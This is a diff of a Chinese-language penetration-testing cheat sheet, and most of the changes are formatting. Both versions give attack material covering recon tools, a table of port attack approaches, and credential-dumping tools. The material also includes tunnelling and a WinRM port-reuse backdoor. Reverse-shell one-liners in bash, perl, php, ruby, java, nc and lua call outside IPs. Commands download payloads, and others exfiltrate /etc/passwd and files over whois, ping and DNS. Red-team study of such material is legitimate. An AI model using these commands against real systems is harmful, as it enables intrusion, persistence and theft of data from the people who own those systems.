@@ -22,9 +22,9 @@
 
 #### 子域名（主公司/子公司）
 
-**OneForAll \(一个就够了\)**
+**OneForAll (一个就够了)**
 
-> [https://paper.seebug.org/1053/](https://paper.seebug.org/1053/) 帮助简介（把API、代理都配置好）
+> &#x20;[https://paper.seebug.org/1053/](https://paper.seebug.org/1053/) 帮助简介（把API、代理都配置好）
 
 ```bash
 python3 oneforall.py --target example.com --port=80,443,8080,8009,7001 --valid=True --path=./subs.csv run
@@ -81,17 +81,17 @@ CMD-ping看回复（IP前的域名有无CDN或WAF）
 
 **ASN码查询C段（大型企业才有）**
 
- [https://tools.ipip.net/as.php](https://tools.ipip.net/as.php) （在这输入IP查ASN码）
+&#x20;[https://tools.ipip.net/as.php](https://tools.ipip.net/as.php) （在这输入IP查ASN码）
 
- [https://www.cidr-report.org/cgi-bin/as-report?as=AS37963](https://www.cidr-report.org/cgi-bin/as-report?as=AS37963) （查询ASN码对应的资产列表）
+&#x20;[https://www.cidr-report.org/cgi-bin/as-report?as=AS37963](https://www.cidr-report.org/cgi-bin/as-report?as=AS37963) （查询ASN码对应的资产列表）
 
 **旁站查询（IP反查域名）**
 
 443 看证书、FOFA搜IP查域名
 
- [http://dns.bugscaner.com/](http://dns.bugscaner.com/)
+&#x20;[http://dns.bugscaner.com/](http://dns.bugscaner.com/)
 
- [https://site.ip138.com/](https://site.ip138.com/)
+&#x20;[https://site.ip138.com/](https://site.ip138.com/)
 
 #### SRC 漏洞库
 
@@ -111,7 +111,7 @@ CMD-ping看回复（IP前的域名有无CDN或WAF）
 
 > 备份文件、测试文件、Github泄露、SVN源码泄露
 >
->  [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)
+> &#x20;[https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)
 
 ```bash
 python3 dirsearch.py -r -R 3 -s 3 -u <URL> -e *
@@ -146,56 +146,56 @@ sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 
 [https://zhuanlan.zhihu.com/p/77656471](https://zhuanlan.zhihu.com/p/77656471)
 
-### 常见端口服务渗透 <a id="&#x5E38;&#x89C1;&#x7AEF;&#x53E3;&#x670D;&#x52A1;&#x6E17;&#x900F;"></a>
+### 常见端口服务渗透 <a href="#chang-jian-duan-kou-fu-wu-shen-tou" id="chang-jian-duan-kou-fu-wu-shen-tou"></a>
 
-| 端口号 | 端口说明 | 渗透思路 |
-| :--- | :--- | :--- |
-| 21/69 | FTP/TFTP：文件传输协议 | 爆破、内网嗅探 |
-| 22 | SSH：远程连接 | 用户名枚举、爆破 |
-| 23 | Telnet：远程连接 | 爆破、内网嗅探 |
-| 25 | SMTP：邮件服务 | 邮件伪造 |
-| 53 | DNS：域名系统 | DNS域传送\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙 |
-| 389 | LDAP | 未授权访问（通过LdapBrowser工具直接连入） |
-| 443 | https服务 | OpenSSL 心脏滴血（nmap -sV --script=ssl-heartbleed 目标） |
-| 445 | SMB服务 | ms17\_010远程代码执行 |
-| 873 | rsync服务 | 未授权访问 |
-| 1090/1099 | Java-rmi | JAVA反序列化远程命令执行漏洞 |
-| 1352 | Lotus Domino邮件服务 | 爆破：弱口令、信息泄漏：源代码 |
-| 1433 | MSSQL | 注入、SA弱口令爆破、提权 |
-| 1521 | Oracle | 注入、TNS爆破 |
-| 2049 | NFS | 配置不当 |
-| 2181 | ZooKeeper服务 | 未授权访问 |
-| 3306 | MySQL | 注入、爆破、写shell、提权 |
-| 3389 | RDP | 爆破、Shift后门、CVE-2019-0708远程代码执行 |
-| 4848 | GlassFish控制台 | 爆破：控制台弱口令、认证绕过 |
-| 5000 | Sybase/DB2数据库 | 爆破、注入 |
-| 5432 | PostgreSQL | 爆破弱口令、高权限执行系统命令 |
-| 5632 | PcAnywhere服务 | 爆破弱口令 |
-| 5900 | VNC | 爆破：弱口令、认证绕过 |
-| 6379 | Redis | 未授权访问、爆破弱口令 |
-| 7001 | WebLogic中间件 | 反序列化、控制台弱口令+部署war包、SSRF |
-| 8000 | jdwp | JDWP 远程命令执行漏洞（[工具](https://github.com/IOActive/jdwp-shellifier)） |
-| 8080/8089 | Tomcat/JBoss/Resin/Jetty/Jenkins | 反序列化、控制台弱口令、未授权 |
-| 8161 | ActiveMQ | admin/admin、任意文件写入、反序列化 |
-| 8069 | Zabbix | 远程命令执行 |
-| 9043 | WebSphere控制台 | 控制台弱口令[https://:9043/ibm/console/logon.jsp、远程代码执行](https://:9043/ibm/console/logon.jsp%E3%80%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C) |
-| 9200/9300 | Elasticsearch服务 | 远程代码执行 |
-| 11211 | Memcache | 未授权访问（nc -vv 目标 11211） |
-| 27017 | MongoDB | 未授权访问、爆破弱口令 |
-| 50000 | SAP | 远程代码执行 |
-| 50070 | hadoop | 未授权访问 |
+| 端口号       | 端口说明                             | 渗透思路                                                             |
+| --------- | -------------------------------- | ---------------------------------------------------------------- |
+| 21/69     | FTP/TFTP：文件传输协议                  | 爆破、内网嗅探                                                          |
+| 22        | SSH：远程连接                         | 用户名枚举、爆破                                                         |
+| 23        | Telnet：远程连接                      | 爆破、内网嗅探                                                          |
+| 25        | SMTP：邮件服务                        | 邮件伪造                                                             |
+| 53        | DNS：域名系统                         | DNS域传送\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙                              |
+| 389       | LDAP                             | 未授权访问（通过LdapBrowser工具直接连入）                                       |
+| 443       | https服务                          | OpenSSL 心脏滴血（nmap -sV --script=ssl-heartbleed 目标）                |
+| 445       | SMB服务                            | ms17\_010远程代码执行                                                  |
+| 873       | rsync服务                          | 未授权访问                                                            |
+| 1090/1099 | Java-rmi                         | JAVA反序列化远程命令执行漏洞                                                 |
+| 1352      | Lotus Domino邮件服务                 | 爆破：弱口令、信息泄漏：源代码                                                  |
+| 1433      | MSSQL                            | 注入、SA弱口令爆破、提权                                                    |
+| 1521      | Oracle                           | 注入、TNS爆破                                                         |
+| 2049      | NFS                              | 配置不当                                                             |
+| 2181      | ZooKeeper服务                      | 未授权访问                                                            |
+| 3306      | MySQL                            | 注入、爆破、写shell、提权                                                  |
+| 3389      | RDP                              | 爆破、Shift后门、CVE-2019-0708远程代码执行                                   |
+| 4848      | GlassFish控制台                     | 爆破：控制台弱口令、认证绕过                                                   |
+| 5000      | Sybase/DB2数据库                    | 爆破、注入                                                            |
+| 5432      | PostgreSQL                       | 爆破弱口令、高权限执行系统命令                                                  |
+| 5632      | PcAnywhere服务                     | 爆破弱口令                                                            |
+| 5900      | VNC                              | 爆破：弱口令、认证绕过                                                      |
+| 6379      | Redis                            | 未授权访问、爆破弱口令                                                      |
+| 7001      | WebLogic中间件                      | 反序列化、控制台弱口令+部署war包、SSRF                                          |
+| 8000      | jdwp                             | JDWP 远程命令执行漏洞（[工具](https://github.com/IOActive/jdwp-shellifier)） |
+| 8080/8089 | Tomcat/JBoss/Resin/Jetty/Jenkins | 反序列化、控制台弱口令、未授权                                                  |
+| 8161      | ActiveMQ                         | admin/admin、任意文件写入、反序列化                                          |
+| 8069      | Zabbix                           | 远程命令执行                                                           |
+| 9043      | WebSphere控制台                     | 控制台弱口令https://:9043/ibm/console/logon.jsp、远程代码执行                 |
+| 9200/9300 | Elasticsearch服务                  | 远程代码执行                                                           |
+| 11211     | Memcache                         | 未授权访问（nc -vv 目标 11211）                                           |
+| 27017     | MongoDB                          | 未授权访问、爆破弱口令                                                      |
+| 50000     | SAP                              | 远程代码执行                                                           |
+| 50070     | hadoop                           | 未授权访问                                                            |
 
 ### 开源情报信息收集（OSINT）
 
 **github**
 
-* Github\_Nuggests（自动爬取Github上文件敏感信息泄露） :[https://github.com/az0ne/Github\_Nuggests](https://github.com/az0ne/Github_Nuggests)
+* Github\_Nuggests（自动爬取Github上文件敏感信息泄露） :[https://github.com/az0ne/Github\_Nuggests](https://github.com/az0ne/Github\_Nuggests)
 * GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :[https://github.com/FeeiCN/GSIL](https://github.com/FeeiCN/GSIL)
-* x-patrol\(小米团队的\):[https://github.com/MiSecurity/x-patrol](https://github.com/MiSecurity/x-patrol)
+* x-patrol(小米团队的):[https://github.com/MiSecurity/x-patrol](https://github.com/MiSecurity/x-patrol)
 
 **whois查询/注册人反查/邮箱反查/相关资产**
 
-* 站长之家:[http://whois.chinaz.com/?DomainName=target.com&ws=](http://whois.chinaz.com/?DomainName=target.com&ws=)
+* 站长之家:[http://whois.chinaz.com/?DomainName=target.com\&ws=](http://whois.chinaz.com/?DomainName=target.com\&ws=)
 * 爱站:[https://whois.aizhan.com/target.com/](https://whois.aizhan.com/target.com/)
 * 微步在线:[https://x.threatbook.cn/](https://x.threatbook.cn/)
 * IP反查:[https://dns.aizhan.com/](https://dns.aizhan.com/)
@@ -203,7 +203,7 @@ sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 * 虎妈查:[http://www.whomx.com/](http://www.whomx.com/)
 * 历史漏洞查询 :
   * 在线查询:[http://wy.zone.ci/](http://wy.zone.ci/)
-  * 自搭建:[https://github.com/hanc00l/wooyun\_publi/](https://github.com/hanc00l/wooyun_publi/)
+  * 自搭建:[https://github.com/hanc00l/wooyun\_publi/](https://github.com/hanc00l/wooyun\_publi/)
 
 **google hacking**
 
@@ -212,7 +212,7 @@ sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 **字典列表**
 
 * passwordlist:[https://github.com/lavalamp-/password-lists](https://github.com/lavalamp-/password-lists)
-* 猪猪侠字典:[https://pan.baidu.com/s/1dFJyedz](https://pan.baidu.com/s/1dFJyedz) [Blasting\_dictionary](https://github.com/rootphantomer/Blasting_dictionary)（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等）
+* 猪猪侠字典:[https://pan.baidu.com/s/1dFJyedz](https://pan.baidu.com/s/1dFJyedz) [Blasting\_dictionary](https://github.com/rootphantomer/Blasting\_dictionary)（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等）
 * 针对特定的厂商，重点构造厂商相关域名的字典
 
 ```markup
@@ -247,7 +247,7 @@ sudo masscan -p 80,443 139.224.94.0/24 --rate 1000000	#全C段扫描
 * Sublist3r ：[https://github.com/aboul3la/Sublist3r](https://github.com/aboul3la/Sublist3r)
 * site:target.com:[https://www.google.com](https://www.google.com)
 * Github代码仓库
-* 抓包分析请求返回值\(跳转/文件上传/app/api接口等\)
+* 抓包分析请求返回值(跳转/文件上传/app/api接口等)
 * 站长帮手links等在线查询网站
 * 域传送漏洞
 
@@ -266,7 +266,7 @@ server dns.domian.com #指定dns服务器
 ls xxx.yyy.cn #列出域信息
 ```
 
-* GetDomainsBySSL.py :[https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&type=note\#/](https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&type=note#/)
+* GetDomainsBySSL.py :[https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a\&type=note#/](https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a\&type=note#/)
 * censys.io证书 :[https://censys.io/certificates?q=target.com](https://censys.io/certificates?q=target.com)
 * crt.sh证书查询:[https://crt.sh/?q=%25.target.com](https://crt.sh/?q=%25.target.com)
 * shadon :[https://www.shodan.io/](https://www.shodan.io/)
@@ -296,7 +296,7 @@ ls xxx.yyy.cn #列出域信息
 
 > 处理并显示通过SMTP接受到的电子邮件消息的Web邮件应用程序；
 >
-> 具有通过HTTP从其它服务器获取内容功能的发布应用程序\(SSRF、XML\)
+> 具有通过HTTP从其它服务器获取内容功能的发布应用程序(SSRF、XML)
 >
 > 记录数据或日志显示在Web页面的入侵检测系统；
 >
@@ -318,7 +318,7 @@ ls xxx.yyy.cn #列出域信息
 
 ### OWASP Top10
 
-> **1.注入：**SQL注入、OS注入\(命令执行\)、LDAP注入 **2.失效的身份认证和会话管理：**弱口令爆破、不安全的散列密码加密\(MD5爆破\) **3.敏感数据泄漏：**源码泄漏、配置文件暴露、www.zip备份文件、默认后台 **4.XML外部实体\(XXE\)** **5.失效的访问控制：**管理页面仅能管理员权限访问；越权漏洞\(垂直越权、水平越权\); JWT-Cookie伪造 **6.安全配置错误：**开放了不必要的功能\(445端口、网页-默认安装页面未删除、页面报错\)、默认密码或空密码 **7.跨站脚本\(XSS\)** **8.不安全的反序列化：**java、php、python **9.使用含有已知漏洞的组件：**未打补丁的系统和组件、使用有已知漏洞的框架版本 **10.不足的日志记录和监控：**代码被删除，日志被修改，无法溯源；应该记录登陆失败次数；监控问题没被管理员响应
+> **1.注入：**SQL注入、OS注入(命令执行)、LDAP注入 **2.失效的身份认证和会话管理：**弱口令爆破、不安全的散列密码加密(MD5爆破) **3.敏感数据泄漏：**源码泄漏、配置文件暴露、www.zip备份文件、默认后台 **4.XML外部实体(XXE)** **5.失效的访问控制：**管理页面仅能管理员权限访问；越权漏洞(垂直越权、水平越权); JWT-Cookie伪造 **6.安全配置错误：**开放了不必要的功能(445端口、网页-默认安装页面未删除、页面报错)、默认密码或空密码 **7.跨站脚本(XSS)** **8.不安全的反序列化：**java、php、python **9.使用含有已知漏洞的组件：**未打补丁的系统和组件、使用有已知漏洞的框架版本 **10.不足的日志记录和监控：**代码被删除，日志被修改，无法溯源；应该记录登陆失败次数；监控问题没被管理员响应
 
 ### 渗透测试CheckList
 
@@ -345,9 +345,9 @@ ls xxx.yyy.cn #列出域信息
 
 **JAVA站文件读取漏洞，下载网站源码工具**
 
- [https://github.com/LandGrey/ClassHound](https://github.com/LandGrey/ClassHound)
+&#x20;[https://github.com/LandGrey/ClassHound](https://github.com/LandGrey/ClassHound)
 
- [https://github.com/Artemis1029/Java\_xmlhack](https://github.com/Artemis1029/Java_xmlhack)
+&#x20;[https://github.com/Artemis1029/Java\_xmlhack](https://github.com/Artemis1029/Java\_xmlhack)
 
 ### 社工打点
 
@@ -368,7 +368,7 @@ ls xxx.yyy.cn #列出域信息
 
 ### 基于系统漏洞进入
 
-* Metasploit\(漏洞利用框架\):[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
+* Metasploit(漏洞利用框架):[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
 * 漏洞利用脚本
 
 ### 网站应用程序渗透
@@ -376,7 +376,7 @@ ls xxx.yyy.cn #列出域信息
 * SQL注入
 * 跨站脚本（XSS）
 * 跨站请求伪造（CSRF）
-* SSRF（[ssrf\_proxy](https://github.com/bcoles/ssrf_proxy)）
+* SSRF（[ssrf\_proxy](https://github.com/bcoles/ssrf\_proxy)）
 * 功能/业务逻辑漏洞
 * 其他漏洞等
 * CMS-内容管理系统漏洞
@@ -411,8 +411,8 @@ ls xxx.yyy.cn #列出域信息
 
 ### Fronting
 
-* [Domain Fronting](https://evi1cg.me/archives/Domain_Fronting.html)
-* [Tor\_Fronting.](https://evi1cg.me/archives/Tor_Fronting.html)
+* [Domain Fronting](https://evi1cg.me/archives/Domain\_Fronting.html)
+* [Tor\_Fronting.](https://evi1cg.me/archives/Tor\_Fronting.html)
 
 ### 代理
 
@@ -435,10 +435,10 @@ ls xxx.yyy.cn #列出域信息
 
 **推荐工具**
 
-| 工具 | 优点 | 缺点 |
-| :--- | :--- | :--- |
-| [**Frp**](https://github.com/fatedier/frp) | 稳定、支持断线重连（大流量不断线） 支持将代理端口放在本地（跳板机只开个frp服务端口） | 配置复杂，体积偏大 |
-| [**Nps**](https://github.com/ehang-io/nps) | 自带Web管理，一键启动 **多级代理友好** | 稳定性不如Frp 会在tmp生成文件 |
+| 工具                                         | 优点                                                     | 缺点                           |
+| ------------------------------------------ | ------------------------------------------------------ | ---------------------------- |
+| [**Frp**](https://github.com/fatedier/frp) | <p>稳定、支持断线重连（大流量不断线）<br>支持将代理端口放在本地（跳板机只开个frp服务端口）</p> | 配置复杂，体积偏大                    |
+| [**Nps**](https://github.com/ehang-io/nps) | <p>自带Web管理，一键启动<br><strong>多级代理友好</strong></p>         | <p>稳定性不如Frp<br>会在tmp生成文件</p> |
 
 #### 端口转发（打17\_010等漏洞）
 
@@ -497,7 +497,7 @@ SSH进程的本地端口映射，将本地端口转发到远端指定机器的�
 
 **远程转发**
 
- 在`Web服务器`上执行如下命令
+&#x20;在`Web服务器`上执行如下命令
 
 ```bash
 ssh -CfNg -R 1122（VPS端口）:10.1.1.3（目标主机，数据库）:3389（目标端口） root@192.168.0.5(VPS的IP)
@@ -581,15 +581,15 @@ python2 reGeorgSocksProxy.py -p <本地Socks5服务监听的端口> -u <Webshell
 python2 reGeorgSocksProxy.py -p 8888 -u http://xxx.com/shell.jsp
 ```
 
- 之后使用浏览器设置Socks代理，就能访问内网主机的端口了，或者结合 Proxifier 连接 3389
+&#x20;之后使用浏览器设置Socks代理，就能访问内网主机的端口了，或者结合 Proxifier 连接 3389
 
 #### HTTP.sys端口复用后门
 
-> HTTP.sys驱动是IIS的主要组成部分，主要负责HTTP协议相关的处理，它有一个重要的功能叫**Port Sharing**，即端口共享；
+> &#x20;HTTP.sys驱动是IIS的主要组成部分，主要负责HTTP协议相关的处理，它有一个重要的功能叫**Port Sharing**，即端口共享；
 >
->  所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可；
+> &#x20;所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可；
 >
->  使用Windows的远程管理服务WinRM，结合HTTP.sys驱动自带的端口复用功能，可实现端口复用后门
+> &#x20;使用Windows的远程管理服务WinRM，结合HTTP.sys驱动自带的端口复用功能，可实现端口复用后门
 
 ```bash
 netsh http show servicestate	#查看所有在HTTP.sys上注册过的url前缀
@@ -630,14 +630,14 @@ winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
 
 **4、后门连接**
 
- 首先开启本机WinRM服务，然后设置信任连接的主机
+&#x20;首先开启本机WinRM服务，然后设置信任连接的主机
 
 ```bash
 winrm quickconfig -q 	# 开启服务
 winrm set winrm/config/Client @{TrustedHosts="*"}  # 设置信任连接的主机
 ```
 
- 执行使用winrs命令连接远程WinRM服务，获取交互shell
+&#x20;执行使用winrs命令连接远程WinRM服务，获取交互shell
 
 ```bash
 winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd
@@ -647,13 +647,13 @@ winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd
 
 #### 参考连接
 
- [端口复用后门 - 0x4D75 - 博客园](https://www.cnblogs.com/0x4D75/p/11381449.html#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8)
+&#x20;[端口复用后门 - 0x4D75 - 博客园](https://www.cnblogs.com/0x4D75/p/11381449.html#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8)
 
 ### 内网跨边界转发
 
-* [NC端口转发](https://blog.csdn.net/l_f0rm4t3d/article/details/24004555)
+* [NC端口转发](https://blog.csdn.net/l\_f0rm4t3d/article/details/24004555)
 * [LCX端口转发](http://blog.chinaunix.net/uid-53401-id-4407931.html)
-* [nps](https://github.com/cnlh/nps) -&gt; 个人用觉得比较稳定 ～
+* [nps](https://github.com/cnlh/nps) -> 个人用觉得比较稳定 ～
 * [frp](https://github.com/fatedier/frp)
 * 代理脚本
   1. [Tunna](https://github.com/SECFORCE/Tunna)
@@ -670,22 +670,22 @@ winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd
 ./ew -s ssocksd -l 1080
 ```
 
-反弹 SOCKS v5 服务器: a\) 先在一台具有公网 ip 的主机A上运行以下命令：
+反弹 SOCKS v5 服务器: a) 先在一台具有公网 ip 的主机A上运行以下命令：
 
 ```bash
 $ ./ew -s rcsocks -l 1080 -e 8888 
 
 ```
 
-b\) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口
+b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口
 
-```text
+```
 $ ./ew -s rssocks -d 1.1.1.1 -e 8888 
 ```
 
 多级级联
 
-```text
+```
 $ ./ew -s lcx_listen -l 1080 -e 8888
 $ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
 $ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
@@ -693,14 +693,14 @@ $ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
 
 lcx\_tran 的用法
 
-```text
+```
 $ ./ew -s ssocksd -l 9999
 $ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
 ```
 
 lcx\_listen、lcx\_slave 的用法
 
-```text
+```
 $ ./ew -s lcx_listen -l 1080 -e 8888
 $ ./ew -s ssocksd -l 9999
 $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
@@ -708,7 +708,7 @@ $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
 
 “三级级联”的本地SOCKS测试用例以供参考
 
-```text
+```
 $ ./ew -s rcsocks -l 1080 -e 8888
 $ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
 $ ./ew -s lcx_listen -l 9999 -e 7777
@@ -727,13 +727,13 @@ reGeorg :[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reG
 
 bash
 
-```text
+```
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
 perl
 
-```text
+```
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
@@ -745,19 +745,19 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 php
 
-```text
+```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ruby
 
-```text
+```
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
 java
 
-```text
+```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
@@ -765,12 +765,12 @@ p.waitFor()
 
 nc
 
-```text
+```
 #使用-e 
 nc -e /bin/sh 223.8.200.234 1234 
 ```
 
-```text
+```
 #不使用-e
 mknod /tmp/backpipe p
 /bin/sh 0/tmp/backpipe | nc attackerip listenport 1>/tmp/backpipe
@@ -778,7 +778,7 @@ mknod /tmp/backpipe p
 
 lua
 
-```text
+```
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
 
@@ -788,32 +788,32 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('202.103.243.12
 
 wput
 
-```text
+```
 wput dir_name ftp://linuxpig:123456@host.com/
 ```
 
 wget
 
-```text
+```
 wget http://site.com/1.rar -O 1.rar
 ```
 
 ariac2（需安装）
 
-```text
+```
 aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2
 ```
 
 powershell
 
-```text
+```
 $p = New-Object System.Net.WebClient 
 $p.DownloadFile("http://domain/file","C:%homepath%file") 
 ```
 
 vbs脚本
 
-```text
+```
 Set args = Wscript.Arguments
 Url = "http://domain/file"
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
@@ -832,7 +832,7 @@ end with
 
 Perl
 
-```text
+```
 #!/usr/bin/perl 
 use LWP::Simple; 
 getstore("http://domain/file", "file");
@@ -842,7 +842,7 @@ getstore("http://domain/file", "file");
 
 Python
 
-```text
+```
 #!/usr/bin/python 
 import urllib2 
 u = urllib2.urlopen('http://domain/file') 
@@ -855,7 +855,7 @@ localFile.close()
 
 Ruby
 
-```text
+```
 #!/usr/bin/ruby
 require 'net/http'
 Net::HTTP.start("www.domain.com") { |http|
@@ -870,7 +870,7 @@ file.write(r.body)
 
 PHP
 
-```text
+```
 <?php
 $url  = 'http://www.example.com/file';
 $path = '/path/to/file';
@@ -886,109 +886,109 @@ file_put_contents($path, $data);
 
 NC attacker
 
-```text
+```
 cat file | nc -l 1234
 ```
 
 target
 
-```text
+```
 nc host_ip 1234 > file
 ```
 
 FTP
 
-```text
+```
 ftp 127.0.0.1 username password get file exit
 ```
 
 TFTP
 
-```text
+```
 tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
 ```
 
 Bitsadmin
 
-```text
+```
 bitsadmin /transfer n http://domain/file c:%homepath%file
 ```
 
 Window 文件共享
 
-```text
+```
 net use x: \127.0.0.1\share /user:example.comuserID myPassword
 ```
 
 SCP 本地到远程
 
-```text
+```
 scp file user@host.com:/tmp
 ```
 
 远程到本地
 
-```text
+```
 scp user@host.com:/tmp file
 ```
 
 rsync 远程rsync服务器中拷贝文件到本地机
 
-```text
+```
 rsync -av root@192.168.78.192::www /databack
 ```
 
 本地机器拷贝文件到远程rsync服务器
 
-```text
+```
 rsync -av /databack root@192.168.78.192::www
 ```
 
 certutil.exe
 
-```text
+```
 certutil.exe -urlcache -split -f http://site.com/file
 ```
 
 copy
 
-```text
+```
 copy \\IP\ShareName\file.exe file.exe
 ```
 
 WHOIS 接收端 Host B：
 
-```text
+```
 nc -vlnp 1337 | sed "s/ //g" | base64 -d 
 ```
 
 发送端 Host A：
 
-```text
+```
 whois -h host_ip -p 1337 `cat /etc/passwd | base64`
 ```
 
 [WHOIS + TAR](https://twitter.com/mubix/status/1102780436118409216) First:
 
-```text
+```
 ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it
 ```
 
 Next
 
-```text
+```
 tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits
 ```
 
 Finally
 
-```text
+```
 cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv #to get the files out
 ```
 
 PING 发送端:
 
-```text
+```
 xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done
 ```
 
@@ -1013,13 +1013,13 @@ def process_packet(pkt):
 sniff(iface="eth0", prn=process_packet)
 ```
 
-```text
+```
 python3 ping_receiver.py
 ```
 
 DIG 发送端:
 
-```text
+```
 xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done
 ```
 
@@ -1041,7 +1041,7 @@ def process_packet(pkt):
 sniff(iface="eth0", prn=process_packet)
 ```
 
-```text
+```
 python3 dns_reciver.py
 ```
 
@@ -1051,45 +1051,45 @@ python3 dns_reciver.py
 
 python2
 
-```text
+```
 python -m SimpleHTTPServer 1337
 ```
 
 python3
 
-```text
+```
 python -m http.server 1337
 ```
 
 PHP 5.4+
 
-```text
+```
 php -S 0.0.0.0:1337
 ```
 
 ruby
 
-```text
+```
 ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
 ```
 
-```text
+```
 ruby -run -e httpd . -p 1337
 ```
 
 Perl
 
-```text
+```
 perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
 ```
 
-```text
+```
 perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |" : $1) if /^GET \/(.*) / })'
 ```
 
 busybox httpd
 
-```text
+```
 busybox httpd -f -p 8000
 ```
 
@@ -1099,7 +1099,7 @@ busybox httpd -f -p 8000
 
 **1、用户列表**
 
-windows用户列表 分析邮件用户，内网\[域\]邮件用户，通常就是内网\[域\]用户
+windows用户列表 分析邮件用户，内网\[域]邮件用户，通常就是内网\[域]用户
 
 **2、进程列表**
 
@@ -1107,15 +1107,15 @@ windows用户列表 分析邮件用户，内网\[域\]邮件用户，通常就�
 
 **3、服务列表**
 
-与安全防范工具有关服务\[判断是否可以手动开关等\] 存在问题的服务\[权限/漏洞\]
+与安全防范工具有关服务\[判断是否可以手动开关等] 存在问题的服务\[权限/漏洞]
 
 **4、端口列表**
 
-开放端口对应的常见服务/应用程序\[匿名/权限/漏洞等\] 利用端口进行信息收集
+开放端口对应的常见服务/应用程序\[匿名/权限/漏洞等] 利用端口进行信息收集
 
 **5、补丁列表**
 
-分析 Windows 补丁 第三方软件\[Java/Oracle/Flash 等\]漏洞
+分析 Windows 补丁 第三方软件\[Java/Oracle/Flash 等]漏洞
 
 **6、本机共享**
 
@@ -1130,7 +1130,7 @@ windows用户列表 分析邮件用户，内网\[域\]邮件用户，通常就�
 **Windows**
 
 * [mimikatz](https://github.com/gentilkiwi/mimikatz)
-* [wce](https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64)
+* [wce](https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce\_v1\_42beta\_x64)
 * [Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump)
 * [mimiDbg](https://github.com/giMini/mimiDbg)
 * [LaZagne](https://github.com/AlessandroZ/LaZagne)
@@ -1168,13 +1168,13 @@ windows用户列表 分析邮件用户，内网\[域\]邮件用户，通常就�
 
 ipconfig:
 
-```text
+```
 ipconfig /all ------> 查询本机 IP 段，所在域等
 ```
 
 net:
 
-```text
+```
 net user ------> 本机用户列表
